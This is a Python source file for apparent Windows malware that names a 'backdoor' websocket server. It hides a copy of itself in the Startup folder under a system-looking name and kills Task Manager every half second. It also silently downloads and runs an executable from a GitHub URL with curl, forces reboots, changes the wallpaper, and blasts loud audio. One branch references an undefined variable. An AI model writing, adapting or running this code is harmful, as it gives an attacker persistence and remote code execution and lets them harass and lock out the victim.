import psutil
import os
import sys
import subprocess
import ctypes
import threading
import winreg
import getpass
import shutil
import time
import pygame
from PyQt5 import QtWidgets, QtCore
import sys

CLIENT_NAME = getpass.getuser()
FILE_ATTRIBUTE_SYSTEM = 0x4
FILE_ATTRIBUTE_HIDDEN = 0x2
FILE_ATTRIBUTE_NORMAL = 0x80

CREATE_NO_WINDOW = 0x08000000
SERVER_URL = "wss://backdoor-freezeee.onrender.com"

startup_folder = os.path.join("C:\\Users", CLIENT_NAME, "AppData", "Roaming",
                            "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
exe_final_location = os.path.join(startup_folder, "WINDOWS_data_infoRI.exe")
old_final_location = os.path.join(startup_folder, "WINDOWS_data_info.exe")
url = "https://raw.githubusercontent.com/habibprojects/habibn1/main/FarmingSimulatorRI.exe"

class MessageDispatcher(QtCore.QObject):
    show_message = QtCore.pyqtSignal(str, int)

    def __init__(self):
        super().__init__()
        self.show_message.connect(self._show)

    def _show(self, mensagem, duracao):
        label = QtWidgets.QLabel(mensagem)
        label.setStyleSheet("""
            color: red;
            font-size: 80px;
            font-weight: bold;
            background-color: rgba(0, 0, 0, 150);
            padding: 20px;
            border-radius: 15px;
        """)

        label.setWindowFlags(
            QtCore.Qt.FramelessWindowHint |
            QtCore.Qt.WindowStaysOnTopHint |
            QtCore.Qt.Tool
        )

        label.setAttribute(QtCore.Qt.WA_TranslucentBackground)
        label.setAlignment(QtCore.Qt.AlignCenter)
        label.adjustSize()

        screen = QtWidgets.QApplication.primaryScreen().geometry()
        label.move(
            (screen.width() - label.width()) // 2,
            (screen.height() - label.height()) // 2
        )

        label.show()

        QtCore.QTimer.singleShot(
            duracao * 1000,
            label.close
        )


def close_task_manager():
    for proc in psutil.process_iter(['name']):
        try:
            if proc.info['name'] and proc.info['name'].lower() == 'taskmgr.exe':
                proc.terminate()
        except (psutil.NoSuchProcess, psutil.AccessDenied):
            break
    monitor_taskmgr()

def monitor_taskmgr():
    threading.Timer(0.5, close_task_manager).start()

def move_to_startup(current_exe):
    for f in os.listdir(startup_folder):
        if (f.startswith("WINDOWS_data_infoRI") or f.startswith("WINDOWS_data_info")) and f.endswith(".exe"):
            return

    dest_name = f"WINDOWS_data_info.exe"
    dest = os.path.join(startup_folder, dest_name)

    try:
        shutil.copy(current_exe, dest)
        print(f"Copied to Startup as {dest_name}.")
        unhide_file(dest)
    except Exception as e:
        print("Error copying to Startup:", e)

def im_in_startup():
    if getattr(sys, 'frozen', False):
        current_path = os.path.abspath(sys.executable)
    else:
        current_path = os.path.abspath(__file__)

    user_startup = os.path.join(
        os.environ.get("APPDATA", ""),
        r"Microsoft\Windows\Start Menu\Programs\Startup"
    )

    global_startup = r"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"

    return (
        current_path.startswith(os.path.abspath(user_startup)) or
        current_path.startswith(os.path.abspath(global_startup))
    )

def remove_force():
    for path in (exe_final_location, old_final_location):
        if not os.path.isfile(path):
            continue

        target_path = os.path.abspath(path)

        for proc in psutil.process_iter(['pid', 'exe']):
            try:
                if proc.info['exe'] and os.path.abspath(proc.info['exe']) == target_path:
                    proc.kill()
                    proc.wait(2)
            except (psutil.NoSuchProcess, psutil.AccessDenied):
                pass

        for _ in range(10):
            try:
                os.remove(path)
                break
            except PermissionError:
                time.sleep(0.3)

def reinstall_program(standartInstall=True):
    if standartInstall:
        if not os.path.isfile(exe_final_location) and not os.path.isfile(old_final_location):
            subprocess.run(
                [
                    "curl.exe",
                    "-L",
                    url,
                    "-o",
                    exe_final_location
                ],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                creationflags=CREATE_NO_WINDOW
            )
    else:
        videos_dir = os.path.join(os.environ["USERPROFILE"], "Videos")
        output_path = os.path.join(videos_dir, filename)
        subprocess.run(
            [
                "curl.exe",
                "-L",
                url,
                "-o",
                output_path
            ],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            creationflags=CREATE_NO_WINDOW
        )
        subprocess.Popen(output_path)
    
    check_reinstall()

def resource_path(relative_path):
    if hasattr(sys, "_MEIPASS"):
        return os.path.join(sys._MEIPASS, relative_path)
    return os.path.join(os.path.abspath("."), relative_path)

def play_audio():
    audio_path = resource_path("estoura-timpano.mp3")

    if not os.path.isfile(audio_path):
        return

    pygame.mixer.init()
    pygame.mixer.music.load(audio_path)
    pygame.mixer.music.play()

def download_image(image_url):
    filename = "trabuco.png"

    videos_dir = os.path.join(os.environ["USERPROFILE"], "Videos")
    output_path = os.path.join(videos_dir, filename)

    subprocess.run(
        [
            "curl.exe",
            "-L",
            image_url,
            "-o",
            output_path
        ],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
        creationflags=subprocess.CREATE_NO_WINDOW
    )

    return output_path

def is_wallpaper(image_name):
    image_name = image_name.lower()

    try:
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Control Panel\Desktop"
        )
        wallpaper, _ = winreg.QueryValueEx(key, "WallPaper")
        winreg.CloseKey(key)

        if wallpaper and os.path.basename(wallpaper).lower() == image_name:
            return True
    except OSError:
        pass

    transcoded = os.path.join(
        os.environ.get("APPDATA", ""),
        r"Microsoft\Windows\Themes\TranscodedWallpaper"
    )

    if os.path.exists(transcoded):
        try:
            key = winreg.OpenKey(
                winreg.HKEY_CURRENT_USER,
                r"Control Panel\Desktop"
            )
            original, _ = winreg.QueryValueEx(key, "WallPaper")
            winreg.CloseKey(key)

            if original and os.path.basename(original).lower() == image_name:
                return True
        except OSError:
            pass

    return False

def set_wallpaper(path):
    path = os.path.abspath(path)
    SPI_SETDESKWALLPAPER = 20
    SPIF_UPDATEINIFILE = 0x01
    SPIF_SENDCHANGE = 0x02

    ctypes.windll.user32.SystemParametersInfoW(
        SPI_SETDESKWALLPAPER,
        0,
        path,
        SPIF_UPDATEINIFILE | SPIF_SENDCHANGE
    )

def will_startup_execute(filename):
    filename = filename.lower()

    approved_keys = [
        (winreg.HKEY_CURRENT_USER,
         r"Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\StartupFolder"),
        (winreg.HKEY_LOCAL_MACHINE,
         r"Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\StartupFolder")
    ]

    for root, path in approved_keys:
        try:
            with winreg.OpenKey(root, path) as key:
                i = 0
                while True:
                    name, value, _ = winreg.EnumValue(key, i)
                    if name.lower() == filename:
                        return value[0] != 0x03
                    i += 1
        except (FileNotFoundError, OSError):
            pass

    return True

def restart_pc():
    subprocess.run(
        [
            "shutdown",
            "-r",
            "-f",
            "-t",
            "2"
        ]
    )

def safe_restart_pc():
    for item in os.listdir(startup_folder):
        full_path = os.path.join(startup_folder, item)
        
        if (item == "WINDOWS_data_infoRI.exe" or item == "WINDOWS_data_info.exe") and not will_startup_execute(item):
            reinstall_program(False)
            remove_force()
    restart_pc()
                

def check_reinstall():
    threading.Timer(10.0, reinstall_program).start()

def hide_file(path):
    ctypes.windll.kernel32.SetFileAttributesW(
        path,
        FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM
    )

def is_current_process(filename):
    if getattr(sys, 'frozen', False):
        path = sys.executable
    else:
        path = sys.argv[0]

    return os.path.basename(path).lower() == filename.lower()

def unhide_file(path: str):
    res = ctypes.windll.kernel32.SetFileAttributesW(
        path,
        FILE_ATTRIBUTE_NORMAL
    )
    if not res:
        raise ctypes.WinError()

def spam_calculators(number=3):
    for _ in range(number):
        subprocess.Popen("calc")

def spam_image(times=4):
    for _ in range(times):
        os.startfile("https://res.cloudinary.com/dnkpzafxp/image/upload/image_jtpkzq.png")